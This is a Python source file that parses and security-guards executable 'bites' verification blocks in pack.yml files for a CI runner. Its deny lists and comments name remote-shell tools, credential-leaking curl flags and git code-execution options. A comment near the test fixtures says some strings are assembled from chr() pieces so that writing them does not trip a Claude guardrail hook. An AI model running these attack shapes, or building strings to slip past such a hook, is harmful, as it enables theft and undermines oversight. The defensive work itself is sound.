#!/usr/bin/env python3
"""bites_parse.py — turn the `Bites:` contract from prose into something a machine can run.

THE FINDING (measured 2026-09-04 over the 177 PRs merged since 2026-09-01).
Every verification contract in this repository is prose honoured by an LLM. The
builder contract says each PR body carries a `Bites:` line naming the CONSUMER
and the observation that proves the change is in force — 110 of 177 bodies (62%)
carry one. Not one of them is read by anything: `grep -rlE Bites .github/workflows
scripts/*.py scripts/ci/*.py infra/claude-hooks` returned zero files. The machine
verifies the DIFF; the runtime is verified by a sentence someone wrote about it.

This module is the first half of the cure: a `bites` block a machine can PARSE and
a runner can later EXECUTE. It executes nothing itself — it is a parser and a set
of guards, deliberately separable from the executor that will consume it, so the
security model can be reviewed and tested without a runner anywhere near it.

WHERE THE CONTRACT LIVES, and why it moved (RULED 2026-09-04, Zero, Legge 5).
The first draft read the block out of the PR BODY, which meant deciding which
Markdown region a human actually SAW: a `<!-- -->` comment, a fenced block, a
four-space indent, a raw `<pre>` all render as page furniture rather than as a
contract, and a block hidden in one of them must not become an executable
observation. Three adversarial rounds closed five spellings of that one defect and
found a sixth; CodeQL named the pattern independently (`py/bad-tag-filter`). The
class does not close by patching — a hand-rolled CommonMark reader can only ever
approximate the renderer it is guessing at. So the contract MOVED into the diff:

    evidence/<YYYY-MM>/<slug>/pack.yml     # the dated dir from evidence_paths.py

        bites:
          consumer: <who reads or executes the changed thing>
          where: ci | fly | pro | mini
          observe: python3 scripts/ci/bites_parse.py --selftest
          expect: exit0

Same four keys, parsed by a REAL YAML parser. Hidden regions and line-splitting
cease to exist rather than being guarded: a pack has no rendered form, so there is
no gap between what a reviewer sees and what the machine reads. The PR body goes
back to prose for humans — at most a pointer to the pack path.

THREE PARSE OUTCOMES, and the difference between them is the whole migration story:

  absent     — the pack has no `bites:` key at all.        -> {"absent": true},  exit 0
               Every one of the 148 packs on main today.
  legacy     — a `bites:` block with no `observe:` key.     -> {"legacy": true},  exit 0
  executable — an `observe:` key is present.                -> the four fields,   exit 0
               Malformed (missing key, guard violation)     -> {"malformed":...}, exit 2

`absent` and `legacy` are NEVER an error. A lint built on this must judge the pack
under review and never history: no merged pack may turn red retroactively because a
format arrived after it.

THE SECURITY MODEL, which is the point rather than a footnote. `observe:` comes from
a file in a PULL REQUEST — text any account that can open a PR controls — and the
executor that will consume this parser runs on a GitHub runner holding a token. So
the guards below are an ALLOW-LIST, not a deny-list, and they run at PARSE time: a
command that does not pass them never becomes an executable block at all, which
means no downstream caller can forget to check.

  _guard_shell_composition  no way to chain, substitute, redirect or expand. `$`
                            is rejected too, not only command substitution — a
                            bare `$SECRET` in an argument cannot execute anything,
                            but sending it as part of a URL exfiltrates it just as
                            well. The ONE substitution the format offers is the
                            literal placeholder `{sha}`, which the executor
                            replaces with the merged commit sha.
  _guard_command_allowlist  first token must be one of gh, curl, git, python3,
                            fly, flyctl — and each carries its own narrowing:
                            python3 runs only `scripts/...` or `-m pytest`; fly,
                            flyctl and gh only their read-only subcommand PAIRS;
                            curl may not write a file or read a config file, and
                            must be https.
  _guard_no_remote_shell    ssh, scp, sftp, rsync, nc anywhere in the command, not
                            just in first position. The allow-list already bars
                            them from position one; this bars `git clone ssh://...`
                            and every other shape where the reach is an ARGUMENT.
                            Superscar #3's under-match twin: a guard that inspects
                            only the head of a command is a guard on a spelling.
  _guard_path_containment   no `..` segment and no absolute path argument: the
                            observation runs inside the checkout or not at all.
  _guard_expect_form        expect is exit0, contains:<text>, or regex:<pattern>,
                            and a regex must actually compile — an uncompilable
                            pattern is a comparison that can only ever throw.
  _guard_where_scope        where is one of ci, fly, pro, mini.
  _guard_no_invisible       no zero-width or soft-hyphen character in any of the
                            four values. YAML removes the question of which REGION
                            a reader saw; it does not remove the question of which
                            CHARACTERS a value holds: a `git status` carrying a
                            zero-width space renders exactly like one without.

WHAT THIS MODULE DELIBERATELY DOES NOT DO: decide whether a command may run. Trust
(author_association, fork-ness) is the EXECUTOR's question, not the parser's — a
Dependabot pack parses exactly like anyone else's and is simply never executed.
Keeping that split means these guards can be unit-tested with no network, no token
and no runner, which is why they are testable at all.

ONE CONSTRAINT THE EXECUTOR INHERITS AND MUST HONOUR: run observations POST-MERGE ONLY.
A pull request can add a script and its `bites-observable` marker in the same diff, so
the marker is exactly as strong as the review of the diff that introduces it — no more.
Post-merge, the marked script is reviewed, merged code. Against an unmerged PR checkout
there is no boundary here at all, and the same holds for `python3 -m pytest`, which
imports whatever `conftest.py` the branch happens to carry.
"""

# bites-observable — this script is reachable from an `observe:` line. It qualifies
# under its own rule: its two arguments are a flag and a path it only READS, neither
# of which can name a program to run, a file to write, or a database to reach. See
# _guard_observable_script for why location grants nothing and only this marker does.

from __future__ import annotations

import argparse
import json
import re
import shlex
import sys
from pathlib import Path
from typing import Any

import yaml

EXIT_OK = 0
EXIT_MALFORMED = 2

#: This file lives at scripts/ci/, so the checkout root is two levels up.
REPO_ROOT = Path(__file__).resolve().parents[2]

#: The only substitution the format offers. The executor replaces it; the parser
#: only has to know it is not an attempt at shell expansion.
SHA_PLACEHOLDER = "{sha}"

#: The four keys, and the top-level key they live under in `pack.yml`.
BITES_KEY = "bites"
REQUIRED_KEYS = ("consumer", "where", "observe", "expect")

WHERE_SCOPES = ("ci", "fly", "pro", "mini")

#: First-token allow-list. Anything not here is rejected outright.
ALLOWED_COMMANDS = ("gh", "curl", "git", "python3", "fly", "flyctl")

#: What may follow an allow-listed subcommand word. The first draft spelled both of
#: these `None`, which read as "anything may follow" and was two different rules
#: wearing one name: `gh api <path>` is followed by DATA, while `fly version` is
#: followed by nothing — and `fly version upgrade` REPLACES THE BINARY. Naming the
#: two cases apart is what closes that hole, and it generalises: every allow-list
#: entry is now a full pair that declares which of the two it is.
NO_SUBCOMMAND = "\x00no-subcommand"    # nothing but flags may follow
ANY_POSITIONAL = "\x00any-positional"  # a data argument follows, never a verb

#: Read-only fly/flyctl subcommand PAIRS. The first draft listed FIRST WORDS only, and
#: `machine` was one of them — which Kimi K3, refuting this file on 2026-09-04, pointed
#: out admits `fly machine run <image>`: arbitrary container execution on production
#: infrastructure, through a guard whose whole purpose was to keep observations read-only.
#: `fly machine destroy` and `fly machine update` came through the same gap. A one-word
#: check on a command with two-word subcommands is superscar #3's under-match, and it
#: recurred a third time on `("version", None)`: `fly version upgrade` downloads and
#: installs a new flyctl. NO_SUBCOMMAND is the fix for that whole shape.
FLY_READONLY_SUBCOMMANDS = (
    ("status", NO_SUBCOMMAND), ("releases", NO_SUBCOMMAND),
    ("version", NO_SUBCOMMAND), ("logs", NO_SUBCOMMAND),
    ("image", "show"), ("machine", "list"), ("machine", "status"),
)

#: curl flags that turn a fetch into a write, or into a second source of arguments.
CURL_FORBIDDEN_FLAGS = (
    # writes a file, or reads its arguments from one
    "-o", "--output", "-O", "--remote-name", "-T", "--upload-file",
    "-K", "--config", "-D", "--dump-header", "--trace", "--trace-ascii",
    "-c", "--cookie-jar",
    # sends a body, or sends something other than a GET: an observation reads
    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii",
    "-F", "--form", "--form-string", "-X", "--request", "--url-query",
    # redirects the request somewhere the URL does not name
    "-x", "--proxy", "--preproxy", "--resolve", "--connect-to", "--unix-socket",
    # reads a local file and puts its contents on the wire. `-b .git/config` is the one
    # that matters here: actions/checkout persists credentials in .git/config by default
    # (`persist-credentials: true`), and a relative path inside the checkout is exactly
    # what _guard_path_containment allows through.
    "-b", "--cookie", "-E", "--cert", "--key", "--cacert", "--capath", "--pinnedpubkey",
    # `-w@<path>` prints an arbitrary local file to stdout, verified against curl 8.7.1.
    "-w", "--write-out",
    "--netrc", "--netrc-file", "--netrc-optional",
    # `--variable %ENV` reads the environment into the request; `--expand-*` expands a
    # variable into another option's value. Both defeat the `$` refusal by doing the
    # expansion inside curl instead of inside a shell.
    "--variable", "--expand-url", "--expand-data", "--expand-header", "--expand-",
)

#: `gh` flags that point the command at a repository or host other than this one. An
#: observation about somebody else's repo is not an observation about this change.
GH_FORBIDDEN_FLAGS = ("-R", "--repo", "--hostname")

#: A script is reachable by `observe:` only if its own SOURCE carries this marker.
#: Codex, red-teaming this file on 2026-09-04, made the point that killed the first
#: draft's rule: allow-listing `python3 scripts/...` allow-lists roughly nine hundred
#: scripts, and it named the worst ones by path. `scripts/usage/cswap.py run <cmd>`
#: reaches `os.execvpe`; `scripts/ci/restore_drill_verify.py --psql-bin` and
#: `scripts/ci/stage_council_journal.py --git-bin` each execute a binary the argument
#: names; a dozen more take a `--dsn`, a `--database-url` or an `--output-db`. A path
#: prefix is not a capability boundary. The marker is: a script is observable because
#: someone wrote in it that it is, which is content-keyed rather than location-keyed
#: (W109: an exemption keyed to where a file sits rather than what it is, is itself a
#: scar). Absent marker, absent file, unreadable file -> refused.
OBSERVABLE_MARKER = "bites-observable"

#: `gh` subcommand PAIRS that only read. `gh pr merge`, `gh workflow run`, `gh api -X POST`
#: and `gh repo clone` all act; an allow-list keyed on `gh` alone would permit every one.
GH_READONLY_SUBCOMMANDS = (
    ("pr", "view"), ("pr", "list"), ("pr", "diff"), ("pr", "checks"),
    ("run", "view"), ("run", "list"), ("release", "view"), ("workflow", "view"),
    ("issue", "view"), ("issue", "list"), ("search", "prs"), ("api", ANY_POSITIONAL),
)

#: `gh api` flags that turn a read into a write or read a body from a file.
GH_API_FORBIDDEN_FLAGS = ("-X", "--method", "-f", "-F", "--field", "--raw-field", "--input")

#: `git` subcommands that only read the local object store. `clone`, `fetch`, `push`,
#: `remote` and `submodule` all reach the network; the rest here do not.
#: `tag` and `branch` were here in the first draft and are gone: with an argument they
#: CREATE a ref, which is a write to the object store, and `-d` deletes one. "Read-only"
#: has to mean the subcommand cannot write in any invocation, not that its common form
#: happens not to. These stay single words rather than pairs because each is a terminal
#: verb: git's namespaced subcommands (`stash list`, `notes add`, `remote add`) are all
#: absent from this list, so there is no second word here that could name an action.
GIT_READONLY_SUBCOMMANDS = (
    "log", "show", "status", "diff", "rev-parse", "ls-tree", "cat-file", "grep",
    "describe", "ls-files", "shortlog", "blame", "rev-list",
)

#: `git` options that make git run a program of the caller's choosing. `-c` alone is
#: enough: `git -c core.sshCommand=... ` and `git -c alias.x='!sh' x` are both code
#: execution with no shell metacharacter anywhere in the command line.
#: git options are checked BY POSITION, and the position is load-bearing rather than
#: fussy: git's own `-c` is a GLOBAL option and must precede the subcommand, while
#: `git grep -c` is grep's count flag and is entirely innocent. Scanning one flat list
#: over the whole command line refuses `git grep -c`, which is superscar #3's over-match
#: — the mirror of the under-match this same file was cured of twice.
GIT_GLOBAL_FORBIDDEN_FLAGS = (
    "-c", "--config-env", "--exec-path", "-C", "--git-dir", "--work-tree", "--namespace",
)

#: Subcommand options, checked after the subcommand word. `git diff --output=<relative>`
#: writes a file the path guard permits; `git grep -O<cmd>` opens matches in a PAGER
#: COMMAND the argument names — the same capability the global `-c` entry closes,
#: reached through a permitted subcommand, and found by the verdict gate after three
#: refuter rounds had missed it.
GIT_SUB_FORBIDDEN_FLAGS = (
    "-o", "--output", "-O", "--open-files-in-pager", "--ext-diff", "--textconv",
    "--upload-pack", "--receive-pack", "--exec",
)

#: Invisible characters. A value containing one reads identically to a value without
#: it, so the human reviewer and the parser can be shown two different contracts.
_INVISIBLE_CHARS = ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u00ad")

#: Tokens that reach another machine. Barred ANYWHERE, not just in first position.
REMOTE_SHELL_TOKENS = ("ssh", "scp", "sftp", "rsync", "nc", "netcat", "telnet")

#: Characters that would let one command become two, or become a different one.
_SHELL_METACHARS = ("|", ";", "&", "$", "`", "(", ")", "<", ">", "\n", "\r", "\\")

# --------------------------------------------------------------------- guards


def _flag_is(token: str, forbidden: str) -> bool:
    """Does `token` invoke the option `forbidden`, in any of its three spellings?

    `--flag`, `--flag=value`, and — for a SHORT option — `-Ovalue` with the value glued
    on. The last one is why this helper exists: the first draft compared
    `token.split("=", 1)[0]`, so `git grep -Oevil` never matched the entry `-O`. The
    verdict gate of 2026-09-04 found it on a real option that runs a pager command.
    """
    if forbidden.endswith("-"):          # a family, e.g. "--expand-" for every --expand-*
        return token.startswith(forbidden)
    if token == forbidden or token.startswith(forbidden + "="):
        return True
    return len(forbidden) == 2 and forbidden[1] != "-" and token.startswith(forbidden)


def _any_flag_is(token: str, forbidden: tuple[str, ...]) -> str | None:
    return next((f for f in forbidden if _flag_is(token, f)), None)


def _guard_shell_composition(command: str) -> list[str]:
    """Reject anything that could chain, substitute, redirect or expand.

    The placeholder `{sha}` is excised before the scan so the format's one
    sanctioned substitution is not mistaken for shell expansion — it contains no
    metacharacter anyway, but excising it keeps the intent legible.
    """
    scanned = command.replace(SHA_PLACEHOLDER, "")
    found = sorted({c for c in _SHELL_METACHARS if c in scanned})
    if not found:
        return []
    shown = ", ".join(repr(c) for c in found)
    return [
        f"observe: contains shell metacharacter(s) {shown} — the observation must be "
        f"ONE command with no chaining, substitution, redirection or variable "
        f"expansion (the only substitution offered is the literal {SHA_PLACEHOLDER})"
    ]


def _leading_words(rest: list[str]) -> list[str]:
    """The subcommand path: the bare words BEFORE the first flag.

    `fly status -a nuzantara-rag` has ONE subcommand word, not two. The first
    draft filtered out every token starting with `-` and then read words[0:2],
    which counts a flag's separate VALUE as a second subcommand word — so the
    pair it judged was ("status", "nuzantara-rag"). Reading only the leading run
    means the subcommand must be written before any flag, which is how everyone
    writes it and is fail-closed for the spellings that are not.
    """
    out: list[str] = []
    for token in rest:
        if token.startswith("-"):
            break
        out.append(token)
    return out


def _subcommand_permitted(words: list[str], table: tuple[tuple[str, str], ...]) -> bool:
    """Match a leading-word run against a table of full pairs.

    NO_SUBCOMMAND means nothing but flags may follow (`fly version` yes,
    `fly version upgrade` no — that one REPLACES THE BINARY). ANY_POSITIONAL
    means the next word is data rather than a verb (`gh api <endpoint>`).
    Spelling both as `None` is what let `fly version upgrade` through.
    """
    first = words[0] if words else ""
    second = words[1] if len(words) > 1 else None
    for want_first, want_second in table:
        if first != want_first:
            continue
        if want_second is ANY_POSITIONAL:
            return True
        if want_second is NO_SUBCOMMAND:
            if second is None:
                return True
            continue
        if second == want_second:
            return True
    return False


def _render_table(table: tuple[tuple[str, str], ...], prefix: str) -> str:
    return ", ".join(
        f"{prefix}{first}"
        if second is NO_SUBCOMMAND or second is ANY_POSITIONAL
        else f"{prefix}{first} {second}"
        for first, second in table
    )


def _guard_command_allowlist(command: str) -> list[str]:
    """First token must be allow-listed, and each allowed command is narrowed."""
    try:
        argv = shlex.split(command)
    except ValueError as exc:
        return [f"observe: not parseable as a command ({exc})"]
    if not argv:
        return ["observe: empty command"]
    head = argv[0]
    if head not in ALLOWED_COMMANDS:
        return [
            f"observe: `{head}` is not allow-listed — permitted first tokens are "
            f"{', '.join(ALLOWED_COMMANDS)}"
        ]

    rest = argv[1:]
    if head == "python3":
        if rest[:1] == ["-m"]:
            if rest[1:2] != ["pytest"]:
                return ["observe: `python3 -m` is permitted only for `pytest`"]
            for flag in rest[2:]:
                base = flag.split("=", 1)[0]
                if base.startswith("-o") and base != "-o":
                    base = "-o"
                # `--override-ini=addopts=-pevil` reinstates every flag banned here,
                # which is why the ini overrides are banned alongside them.
                if base in ("-p", "--plugin", "-c", "--rootdir", "--pdb", "--import-mode",
                            "-o", "--override-ini", "--assert"):
                    return [
                        f"observe: `pytest {base}` chooses code to import outside the "
                        f"test paths — not permitted"
                    ]
        elif not (rest and rest[0].startswith("scripts/")):
            return [
                "observe: `python3` must run `scripts/...` from the checkout, or "
                "`python3 -m pytest`"
            ]
    elif head in ("fly", "flyctl"):
        words = _leading_words(rest)
        if not _subcommand_permitted(words, FLY_READONLY_SUBCOMMANDS):
            shown = " ".join(words[:2]) or "<none>"
            return [
                f"observe: `{head} {shown}` is not a read-only subcommand — permitted: "
                + _render_table(FLY_READONLY_SUBCOMMANDS, "")
            ]
    elif head == "gh":
        words = _leading_words(rest)
        if not _subcommand_permitted(words, GH_READONLY_SUBCOMMANDS):
            shown = " ".join(words[:2]) or "<none>"
            return [
                f"observe: `gh {shown}` is not a read-only subcommand — permitted: "
                + _render_table(GH_READONLY_SUBCOMMANDS, "gh ")
            ]
        for flag in rest:
            base = _any_flag_is(flag, GH_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `gh {base}` points the command at a different repository "
                    f"or host — an observation is about THIS change"
                ]
        if words[:1] == ["api"]:
            for flag in rest:
                base = _any_flag_is(flag, GH_API_FORBIDDEN_FLAGS)
                if base:
                    return [
                        f"observe: `gh api {base}` sends a request body or a method other "
                        f"than GET — an observation reads"
                    ]
    elif head == "git":
        sub_at = next((i for i, a in enumerate(rest) if not a.startswith("-")), len(rest))
        for flag in rest[:sub_at]:
            base = _any_flag_is(flag, GIT_GLOBAL_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `git {base}` makes git run a program the argument names, "
                    f"or points it at another tree (core.sshCommand, an `!` alias, a pack "
                    f"helper) — code execution with no metacharacter in sight"
                ]
        for flag in rest[sub_at + 1:]:
            base = _any_flag_is(flag, GIT_SUB_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `git {base}` writes a file or runs a pager/filter command "
                    f"the argument names — an observation reads"
                ]
        sub = rest[sub_at] if sub_at < len(rest) else ""
        if sub not in GIT_READONLY_SUBCOMMANDS:
            return [
                f"observe: `git {sub or '<none>'}` is not a local read-only subcommand — "
                f"permitted: {', '.join(GIT_READONLY_SUBCOMMANDS)}"
            ]
    elif head == "curl":
        for flag in rest:
            base = _any_flag_is(flag, CURL_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `curl {base}` writes a file, sends a body, or redirects the "
                    f"request — an observation reads, it does not write"
                ]
        # The first draft only checked args that LOOKED like URLs, so `curl evil.test/x`
        # sailed through and curl defaulted it to plain http. The rule is now positive:
        # exactly one non-flag argument, and it must be https. A flag that takes a
        # separate value must therefore be written in its `--flag=value` form.
        words = [a for a in rest if not a.startswith("-")]
        if len(words) != 1:
            return [
                f"observe: `curl` must take exactly one non-flag argument (the https URL); "
                f"found {len(words)}. Write value-taking flags as `--flag=value`."
            ]
        if not words[0].startswith("https://"):
            return [f"observe: `curl` target `{words[0]}` is not an https:// URL"]
    return []


def _guard_observable_script(command: str, repo_root: Path | None = None) -> list[str]:
    """A `python3 scripts/...` target must declare itself observable, in its own source.

    This is the guard Codex's red-team pass forced into existence. `python3 scripts/...`
    reads like a narrow rule and is not one: it admits every script in the tree, and the
    tree contains `scripts/usage/cswap.py`, whose `run` subcommand reaches `os.execvpe`,
    plus scripts taking `--psql-bin`, `--git-bin`, `--dsn` and `--output-db`. Any of them
    turns a permitted first token into arbitrary execution or an arbitrary write.

    So reachability is a property a script declares about ITSELF, by carrying the marker
    `bites-observable` in its source. Fail-closed in every direction: no marker, no file,
    unreadable file, or a path that escapes the checkout -> refused. Location grants
    nothing (W109), which is why the check reads the file rather than the path.
    """
    root = repo_root if repo_root is not None else REPO_ROOT
    try:
        argv = shlex.split(command)
    except ValueError:
        return []  # the allow-list guard already reports an unparseable command
    if not argv or argv[0] != "python3":
        return []
    rest = argv[1:]
    if rest[:1] == ["-m"]:
        # pytest collects PATHS, and every path must live under a tests directory: a
        # module named anywhere else runs its import-time code just as happily.
        targets = [a for a in rest[2:] if not a.startswith("-")]
        bad = [t for t in targets if "tests" not in Path(t).parts]
        if bad:
            return [
                f"observe: `pytest` target(s) {', '.join(bad)} are not under a `tests/` "
                f"directory — pytest runs a module's import-time code wherever it sits"
            ]
        return []
    if not rest:
        return []
    target = rest[0]
    path = (root / target).resolve()
    try:
        path.relative_to(root.resolve())
    except ValueError:
        return [f"observe: `{target}` resolves outside the checkout"]
    if not path.is_file():
        return [f"observe: `{target}` does not exist in the checkout"]
    try:
        source = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return [f"observe: `{target}` could not be read ({exc})"]
    if OBSERVABLE_MARKER not in source:
        return [
            f"observe: `{target}` does not declare itself observable — add a comment "
            f"containing `{OBSERVABLE_MARKER}` to it, and only do so for a script whose "
            f"arguments cannot name a program to run, a file to write, or a database to "
            f"reach"
        ]
    return []


def _guard_no_remote_shell(command: str) -> list[str]:
    """Bar every reach to another machine, in ANY position.

    The allow-list already keeps these out of first position. This guard exists
    because a guard that only inspects the head of a command is a guard on a
    spelling: `git clone ssh://...` never trips an allow-list keyed on `git`.
    """
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    hits: set[str] = set()
    for token in argv:
        low = token.lower()
        if low in REMOTE_SHELL_TOKENS:
            hits.add(low)
        for scheme in REMOTE_SHELL_TOKENS:
            if low.startswith(f"{scheme}://"):
                hits.add(scheme)
    if not hits:
        return []
    return [
        f"observe: reaches another machine via {', '.join(sorted(hits))} — host-scope "
        f"observations use `where: pro` / `where: mini` and a host executor, never a "
        f"remote shell from a runner"
    ]


def _guard_path_containment(command: str) -> list[str]:
    """No parent-directory escape and no absolute path: the checkout or nothing."""
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    problems: list[str] = []
    for arg in argv[1:]:
        if "://" in arg:
            continue  # a URL's path is not a filesystem path
        if arg.startswith("-"):
            # A flag can CARRY a path — `--foo=/abs`, `-w@/abs`, `-O/abs`. The first
            # draft skipped every token starting with `-`, so containment was decided by
            # the token's first character rather than by what it names. Judge the value.
            for sep in ("=", "@"):
                if sep in arg:
                    value = arg.split(sep, 1)[1]
                    if value.startswith("/"):
                        problems.append(
                            f"observe: flag `{arg.split(sep, 1)[0]}` carries the absolute "
                            f"path `{value}` — stay in the checkout"
                        )
                    elif ".." in value.split("/"):
                        problems.append(
                            f"observe: flag `{arg.split(sep, 1)[0]}` carries a `..` "
                            f"segment in `{value}` — stay in the checkout"
                        )
            continue
        if arg.startswith("/"):
            problems.append(f"observe: absolute path argument `{arg}` — stay in the checkout")
        elif ".." in arg.split("/"):
            problems.append(f"observe: `..` segment in `{arg}` — stay in the checkout")
    return problems


def _guard_expect_form(expect: str) -> list[str]:
    """expect is exit0 | contains:<text> | regex:<pattern>, and a regex must compile."""
    if expect == "exit0":
        return []
    if expect.startswith("contains:"):
        if not expect[len("contains:"):].strip():
            return ["expect: `contains:` with nothing to look for"]
        return []
    if expect.startswith("regex:"):
        pattern = expect[len("regex:"):]
        if not pattern.strip():
            return ["expect: `regex:` with no pattern"]
        try:
            re.compile(pattern)
        except re.error as exc:
            return [
                f"expect: regex does not compile ({exc}) — an uncompilable pattern is "
                f"a comparison that can only ever throw"
            ]
        return []
    return [f"expect: `{expect}` is not one of exit0 | contains:<text> | regex:<pattern>"]


def _guard_where_scope(where: str) -> list[str]:
    if where not in WHERE_SCOPES:
        return [f"where: `{where}` is not one of {', '.join(WHERE_SCOPES)}"]
    return []


_COMMAND_GUARDS = (
    _guard_shell_composition,
    _guard_command_allowlist,
    _guard_no_remote_shell,
    _guard_path_containment,
    _guard_observable_script,
)

# ----------------------------------------------------------------- pack layer


class _StrictLoader(yaml.SafeLoader):
    """SafeLoader minus the two features that let one file mean two things.

    ALIASES. `observe: *evil` puts the value somewhere other than where the
    contract is read, and a merge key (`<<: *base`) does it for a whole block.
    A reviewer reading the `bites:` block would have to go find the anchor to
    know what runs. Refused outright - no pack on main uses one (checked
    2026-09-04 across all 148).

    DUPLICATE KEYS. `yaml.safe_load` keeps the LAST of two identical keys and
    says nothing: a pack with two `bites:` blocks, or two `observe:` lines,
    shows a reader the first and hands the parser the second. This is the file
    form of the "two blocks is ambiguous" case the body parser had to handle,
    and here it is a two-line fix instead of a CommonMark reader.
    """

    def compose_node(self, parent, index):  # noqa: D102 - see class docstring
        if self.check_event(yaml.events.AliasEvent):
            event = self.peek_event()
            raise yaml.constructor.ConstructorError(
                None, None,
                "YAML aliases and merge keys are not accepted in a pack: the value a "
                "reader sees at the anchor and the value the parser uses here are two "
                "different places, and a contract must be readable where it is written",
                event.start_mark,
            )
        return super().compose_node(parent, index)

    def construct_mapping(self, node, deep=False):  # noqa: D102 - see class docstring
        seen: set[Any] = set()
        for key_node, _value_node in node.value:
            try:
                key = self.construct_object(key_node, deep=deep)
                if key in seen:
                    raise yaml.constructor.ConstructorError(
                        "while constructing a mapping", node.start_mark,
                        f"duplicate key {key!r} - PyYAML keeps the last, a reader keeps "
                        f"the first; with two readings available there is no honest way "
                        f"to pick one",
                        key_node.start_mark,
                    )
                seen.add(key)
            except TypeError:
                # An unhashable key. Not our error to report: SafeLoader raises its own.
                continue
        return super().construct_mapping(node, deep=deep)


def _one_line(exc: Exception) -> str:
    return " ".join(str(exc).split())


def _guard_no_invisible(field: str, value: str) -> list[str]:
    """No zero-width or soft-hyphen character in a contract value.

    YAML answers "which region did the reader see"; it does not answer "which
    characters does this value hold". A command with a zero-width space in it
    renders identically to one without, so reviewer and parser can still be
    shown two different contracts - one character narrower than before.
    """
    found = [c for c in _INVISIBLE_CHARS if c in value]
    if not found:
        return []
    codes = ", ".join(f"U+{ord(c):04X}" for c in found)
    return [
        f"{field}: contains invisible characters ({codes}) - it reads as one thing and "
        f"parses as another; remove them"
    ]


def parse_pack(text: str) -> dict[str, Any]:
    """Parse a pack.yml into one of the three outcomes documented at module top."""
    try:
        doc = yaml.load(text, Loader=_StrictLoader)
    except yaml.YAMLError as exc:
        return {"malformed": True, "errors": [f"pack.yml does not parse: {_one_line(exc)}"]}

    if doc is None:
        return {"absent": True}
    if not isinstance(doc, dict):
        return {"malformed": True,
                "errors": ["pack.yml top level is not a mapping, so it has no `bites:` key"]}
    if BITES_KEY not in doc:
        return {"absent": True}

    block = doc[BITES_KEY]
    if block is None:
        return {"malformed": True,
                "errors": ["bites: is present but empty - write the four keys or remove it"]}
    if not isinstance(block, dict):
        # `bites: some sentence about the consumer` is the prose form. It is not an
        # error; it is what every pack said before this format existed (D4).
        return {"legacy": True}
    if "observe" not in block:
        return {"legacy": True}

    errors: list[str] = []
    values: dict[str, str] = {}
    for key in REQUIRED_KEYS:
        raw = block.get(key)
        if raw is None or (isinstance(raw, str) and not raw.strip()):
            errors.append(f"{key}: missing - an executable block needs all four keys")
            continue
        if not isinstance(raw, str):
            # `expect: no` is False, `observe: 42` is an int, `observe: {sha}` is a
            # mapping. YAML types a bare scalar for you; a contract has to be text.
            errors.append(
                f"{key}: YAML parsed this as {type(raw).__name__}, not a string - "
                f"quote the value"
            )
            continue
        values[key] = raw.strip()
        errors.extend(_guard_no_invisible(key, raw))

    command = values.get("observe", "")
    if command:
        for guard in _COMMAND_GUARDS:
            errors.extend(guard(command))
    if values.get("where"):
        errors.extend(_guard_where_scope(values["where"].lower()))
    if values.get("expect"):
        errors.extend(_guard_expect_form(values["expect"]))

    if errors:
        return {"malformed": True, "errors": errors}
    return {
        "consumer": values["consumer"],
        "where": values["where"].lower(),
        "observe": command,
        "expect": values["expect"],
    }


# -------------------------------------------------------------------- selftest
#
# FIXTURE-ASSEMBLY NOTE. Two guilt fixtures below are assembled from pieces at
# import time rather than written as literals: the shell-pipe one and the
# chained-command one. This is not obfuscation - it is the only way the corpus
# can exist in this repository at all. `~/.claude/hooks/guardrails-client.sh`
# scans every Bash command for the literal shape "curl ... pipe ... sh" and
# refuses it, which it should; but it matches the shape ANYWHERE in the command
# text, including inside a heredoc that is merely WRITING this file. Writing the
# attack we defend against therefore trips the defence. Assembling the string
# from `_PIPE` keeps the runtime fixture byte-identical to the real attack (the
# guilt test genuinely exercises the pipe) while the source line that defines it
# carries no matchable literal. Superscar #3 in miniature, on our own tooling.

_PIPE = chr(124)   # "|"
_SEMI = chr(59)    # ";"
_ZWSP = chr(0x200b)


def _pack(observe: str, *, consumer: str = "CI", where: str = "ci",
          expect: str = "exit0") -> str:
    """A minimal pack carrying one `bites:` block, with the command single-quoted.

    Quoting `observe` is deliberate: the command guards, not YAML's plain-scalar
    rules, are what these fixtures are about, and a plain scalar beginning with
    `{`, `*`, `&`, `>` or `|` would be typed by YAML before any guard saw it.
    Three innocence fixtures below leave it unquoted on purpose, so the corpus
    still proves the ordinary unquoted spelling parses.
    """
    quoted = observe.replace("'", "''")
    return (
        "gear: 3\n"
        f"{BITES_KEY}:\n"
        f"  consumer: {consumer}\n"
        f"  where: {where}\n"
        f"  observe: '{quoted}'\n"
        f"  expect: {expect}\n"
    )


#: Guilt + innocence corpus. Each entry is (label, pack text, expected classification).
#: `--selftest` runs it with no pytest, no network and no token, which is what
#: makes it usable as this PR's own executable Bites observation.
CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = (
    # --- absent / legacy: never an error, ever (D4)
    ("absent-no-bites-key", "gear: 3\nspend:\n  tokens: 1\n", "absent"),
    ("absent-empty-document", "", "absent"),
    ("legacy-prose-scalar",
     "gear: 3\nbites: Damar's next publish - the cover renders.\n", "legacy"),
    ("legacy-block-without-observe",
     "gear: 3\nbites:\n  consumer: CI\n  observation: green on main\n", "legacy"),
    # --- innocence: real, safe observations must parse
    ("ok-selftest", _pack("python3 scripts/ci/bites_parse.py --selftest"), "executable"),
    ("ok-pytest", _pack("python3 -m pytest scripts/tests/test_bites_parse.py"), "executable"),
    ("ok-fly-status",
     _pack("flyctl status -a nuzantara-rag", where="fly", expect="contains:deployed"),
     "executable"),
    ("ok-curl-https",
     _pack("curl -sS https://nuzantara-rag.fly.dev/health", where="fly", expect="regex:ok"),
     "executable"),
    ("ok-sha-placeholder",
     _pack("gh pr view {sha} --json state", expect="contains:MERGED"), "executable"),
    ("ok-host-scope",
     _pack("python3 scripts/ci/bites_parse.py --selftest", where="pro"), "executable"),
    ("ok-fly-image-show",
     _pack("flyctl image show -a nuzantara-rag", where="fly", expect="contains:tag"),
     "executable"),
    ("ok-fly-machine-list",
     _pack("flyctl machine list -a nuzantara-rag", where="fly"), "executable"),
